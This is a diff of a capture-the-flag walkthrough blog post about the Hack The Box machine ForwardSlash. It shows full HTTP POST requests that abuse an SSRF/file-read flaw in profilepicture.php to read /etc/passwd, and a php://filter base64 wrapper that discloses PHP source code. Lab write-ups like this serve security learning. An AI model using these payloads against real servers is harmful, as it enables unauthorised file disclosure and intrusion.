@@ -57,7 +57,7 @@ Going back the dashboard options, I notice the option to change my profile pictu
 ![image]({{0xtaylur.github.io}}/assets/forwardslash/disabled.png)
 
 This is just disabled client-side with the`disabled`HTML tag:
-```
+```html
 <form action="/profilepicture.php" method="post">
         URL:
         <input type="text" name="url" disabled style="width:600px"><br>
@@ -65,5 +65,53 @@ This is just disabled client-side with the`disabled`HTML tag:
 </form>
 ```
 
-Using Burp, I can send a POST request to`profilepicture.php`and send it to the repeater tab. After some testing with the URL parameter, I found I was able to use SSRF and read file with it. The first thing I tried was`/etc/passwd`
+Using Burp, I can send a POST request to`profilepicture.php`and send it to the repeater tab. After some testing with the URL parameter, I found I was able to use SSRF and read file with it. The first thing I tried was`/etc/passwd`.
 ![image]({{0xtaylur.github.io}}/assets/forwardslash/burp_etc.png)
+
+From the`/etc/passwd` file, I find two users:`chiv`and`pain`
+
+I remember how`/dev` could not be accessed from my box. By using the http URI handler in the`url` parameter I can send requests that originate from localhost to get around the IP restriction, reaching an API test page. I could not find anything useful out of this so I try to retrieve the PHP source code of`/dev/index.php`.
+```
+POST /profilepicture.php HTTP/1.1
+Host: backup.forwardslash.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://backup.forwardslash.htb/welcome.php
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=7pqvee5324kd0gkakssmsprjtj
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Cache-Control: max-age=0
+Content-Length: 16
+
+url=///var/www/backup.forwardslash.htb/dev/index.php
+```
+
+This is the response I got:
+![image]({{0xtaylur.github.io}}/assets/forwardslash/response.png)
+
+I try to get around this by using a`PHP`wrapper and encoding it in base64.
+```
+POST /profilepicture.php HTTP/1.1
+Host: backup.forwardslash.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://backup.forwardslash.htb/welcome.php
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=7pqvee5324kd0gkakssmsprjtj
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Cache-Control: max-age=0
+Content-Length: 101
+
+url=php://filter/convert.base64-encode/resource=file:///var/www/backup.forwardslash.htb/dev/index.php
+```
+
+We have a response encoded in base64 come back to us.
+![image]({{0xtaylur.github.io}}/assets/forwardslash/base64.png)
